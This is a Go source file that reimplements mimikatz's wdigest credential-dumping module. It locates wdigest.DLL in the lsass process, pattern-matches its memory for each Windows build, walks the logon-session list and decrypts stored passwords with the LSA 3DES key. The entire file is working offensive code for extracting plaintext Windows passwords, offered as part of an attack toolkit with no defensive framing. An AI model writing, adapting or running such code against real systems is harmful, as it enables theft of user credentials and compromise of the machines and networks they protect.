package kiwi

import (
	"bytes"
	"reflect"
	"runtime"
	"sync"
	"time"
	"unicode/utf16"
	"unsafe"

	"github.com/pkg/errors"
	"golang.org/x/sys/windows"

	"project/internal/logger"
	"project/internal/module/windows/api"
)

type wdigest struct {
	ctx *Kiwi

	primaryOffset int
	credAddress   uintptr

	mu sync.Mutex
}

func newWdigest(ctx *Kiwi) *wdigest {
	return &wdigest{ctx: ctx}
}

func (wdigest *wdigest) logf(lv logger.Level, format string, log ...interface{}) {
	wdigest.ctx.logger.Printf(lv, "kiwi-wdigest", format, log...)
}

func (wdigest *wdigest) log(lv logger.Level, log ...interface{}) {
	wdigest.ctx.logger.Println(lv, "kiwi-wdigest", log...)
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.c

var (
	patternWin5xX64PasswordSet = []byte{0x48, 0x3B, 0xDA, 0x74}
	patternWin6xX64PasswordSet = []byte{0x48, 0x3B, 0xD9, 0x74}

	wdigestReferencesX64 = []*patchGeneric{
		{
			minBuild: buildWinXP,
			search: &patchPattern{
				length: len(patternWin5xX64PasswordSet),
				data:   patternWin5xX64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 36},
		},
		{
			minBuild: buildWin2003,
			search: &patchPattern{
				length: len(patternWin5xX64PasswordSet),
				data:   patternWin5xX64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 48},
		},
		{
			minBuild: buildWinVista,
			search: &patchPattern{
				length: len(patternWin6xX64PasswordSet),
				data:   patternWin6xX64PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 48},
		},
	}
)

var (
	patternWin5xX86PasswordSet      = []byte{0x74, 0x18, 0x8B, 0x4D, 0x08, 0x8B, 0x11}
	patternWin60X86PasswordSet      = []byte{0x74, 0x11, 0x8B, 0x0B, 0x39, 0x4E, 0x10}
	patternWin63X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0A, 0x39, 0x4E, 0x10}
	patternWin64X86PasswordSet      = []byte{0x74, 0x15, 0x8B, 0x0F, 0x39, 0x4E, 0x10}
	patternWin10v1809X86PasswordSet = []byte{0x74, 0x15, 0x8b, 0x17, 0x39, 0x56, 0x10}

	wdigestReferencesX86 = []*patchGeneric{
		{
			minBuild: buildWinXP,
			search: &patchPattern{
				length: len(patternWin5xX86PasswordSet),
				data:   patternWin5xX86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 36},
		},
		{
			minBuild: buildWin2003,
			search: &patchPattern{
				length: len(patternWin5xX86PasswordSet),
				data:   patternWin5xX86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 28},
		},
		{
			minBuild: buildWinVista,
			search: &patchPattern{
				length: len(patternWin60X86PasswordSet),
				data:   patternWin60X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 32},
		},
		{
			minBuild: buildMinWin81,
			search: &patchPattern{
				length: len(patternWin63X86PasswordSet),
				data:   patternWin63X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -4, off1: 32},
		},
		{
			minBuild: buildMinWin10,
			search: &patchPattern{
				length: len(patternWin64X86PasswordSet),
				data:   patternWin64X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 32},
		},
		{
			minBuild: buildWin10v1809,
			search: &patchPattern{
				length: len(patternWin10v1809X86PasswordSet),
				data:   patternWin10v1809X86PasswordSet,
			},
			patch:   &patchPattern{length: 0, data: nil},
			offsets: &patchOffsets{off0: -6, off1: 32},
		},
	}
)

func (wdigest *wdigest) searchAddresses(pHandle windows.Handle) error {
	module, err := wdigest.ctx.lsass.GetBasicModuleInfo(pHandle, "wdigest.DLL")
	if err != nil {
		return err
	}
	// read wdigest.dll memory
	memory := make([]byte, module.size)
	size := uintptr(module.size)
	_, err = api.ReadProcessMemory(pHandle, module.address, &memory[0], size)
	if err != nil {
		return errors.WithMessage(err, "failed to read memory about wdigest.DLL")
	}
	// search logon session list pattern
	var patches []*patchGeneric
	switch runtime.GOARCH {
	case "386":
		patches = wdigestReferencesX86
	case "amd64":
		patches = wdigestReferencesX64
	}
	patch := wdigest.ctx.selectGenericPatch(patches)
	index := bytes.Index(memory, patch.search.data)
	if index == -1 {
		return errors.New("failed to search wdigest primary pattern")
	}
	address := module.address + uintptr(index+patch.offsets.off0)
	var offset int32
	size = unsafe.Sizeof(offset)
	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
	if err != nil {
		return errors.WithMessage(err, "failed to read offset about wdigest credential address")
	}
	credAddress := address + unsafe.Sizeof(offset) + uintptr(offset)
	wdigest.logf(logger.Debug, "credential address is 0x%X", credAddress)
	wdigest.primaryOffset = patch.offsets.off1
	wdigest.credAddress = credAddress
	return nil
}

// reference:
// https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/packages/kuhl_m_sekurlsa_wdigest.h

type wdigestListEntry struct {
	fLink      uintptr
	bLink      uintptr
	usageCount uint32
	this       uintptr
	luid       windows.LUID
}

// Wdigest contains credential information.
type Wdigest struct {
	Domain   string
	Username string
	Password string
}

func (wdigest *wdigest) GetPassword(pHandle windows.Handle, logonID windows.LUID) (*Wdigest, error) {
	wdigest.mu.Lock()
	defer wdigest.mu.Unlock()
	if wdigest.credAddress == 0 {
		err := wdigest.searchAddresses(pHandle)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to search wdigest credential address")
		}
	}
	// read wdigest credential data address
	address := wdigest.credAddress
	var addr uintptr
	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&addr)), unsafe.Sizeof(addr))
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest credential list address")
	}
	// read linked list address by LUID
	ticker := time.NewTicker(3 * time.Millisecond)
	defer ticker.Stop()
	var resultAddr uintptr
	for {
		// prevent dead loop
		select {
		case <-ticker.C:
		case <-wdigest.ctx.context.Done():
			return nil, wdigest.ctx.context.Err()
		}
		if addr == address {
			break
		}
		var entry wdigestListEntry
		size := unsafe.Offsetof(wdigestListEntry{}.luid) + unsafe.Sizeof(windows.LUID{})
		_, err = api.ReadProcessMemory(pHandle, addr, (*byte)(unsafe.Pointer(&entry)), size)
		if err != nil {
			break
		}
		if logonID == entry.luid {
			resultAddr = addr
			break
		}
		addr = entry.fLink
	}
	if resultAddr == 0x00 { // not found
		return nil, nil
	}
	wdigest.logf(logger.Debug, "found credential at address: 0x%X", resultAddr)
	// read primary credential
	var cred genericPrimaryCredential
	credAddr := uintptr(int(resultAddr) + wdigest.primaryOffset)
	size := uintptr(wdigest.primaryOffset + int(unsafe.Sizeof(cred)))
	_, err = api.ReadProcessMemory(pHandle, credAddr, (*byte)(unsafe.Pointer(&cred)), size)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest primary credential")
	}
	username, err := api.ReadLSAUnicodeString(pHandle, &cred.Username)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest credential username")
	}
	// if username == "" {
	// 	return nil, nil
	// }
	domain, err := api.ReadLSAUnicodeString(pHandle, &cred.Domain)
	if err != nil {
		return nil, errors.WithMessage(err, "failed to read wdigest credential domain")
	}
	w := Wdigest{
		Domain:   domain,
		Username: username,
	}
	// read encrypted password
	lus := cred.Password
	if lus.MaximumLength != 0 {
		encPassword := make([]byte, int(lus.MaximumLength))
		size = uintptr(lus.MaximumLength)
		_, err = api.ReadProcessMemory(pHandle, lus.Buffer, &encPassword[0], size)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to read wdigest credential encrypted password")
		}
		pwd := make([]byte, len(encPassword))
		// iv will be changed, so we need copy
		// TODO call function
		iv := make([]byte, 8)
		copy(iv, wdigest.ctx.lsaNT6.iv[:8])
		_, err = api.BCryptDecrypt(wdigest.ctx.lsaNT6.key3DES, encPassword, 0, iv, pwd)
		if err != nil {
			return nil, errors.WithMessage(err, "failed to decrypt wdigest credential password")
		}
		var utf16Str []uint16
		sh := (*reflect.SliceHeader)(unsafe.Pointer(&utf16Str))
		sh.Len = int(lus.Length / 2)
		sh.Cap = int(lus.Length / 2)
		sh.Data = uintptr(unsafe.Pointer(&pwd[0]))
		w.Password = string(utf16.Decode(utf16Str))
	}
	return &w, nil
}

func (wdigest *wdigest) Close() {
	wdigest.ctx = nil
}
